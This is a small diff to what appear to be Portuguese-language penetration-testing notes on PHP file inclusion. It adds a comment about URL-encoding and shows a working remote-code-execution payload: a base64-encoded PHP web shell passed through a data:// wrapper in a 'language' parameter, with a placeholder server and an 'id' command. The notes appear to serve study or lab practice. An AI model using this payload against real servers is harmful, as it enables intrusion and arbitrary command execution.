@@ -173,6 +173,8 @@ allow_url_include = On
 # Remote Code Execution
 echo '<?php system($_GET["cmd"]); ?>' | base64
 
+# Após gerar o base64 realizar o URL encode
+
 http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 
 # Input
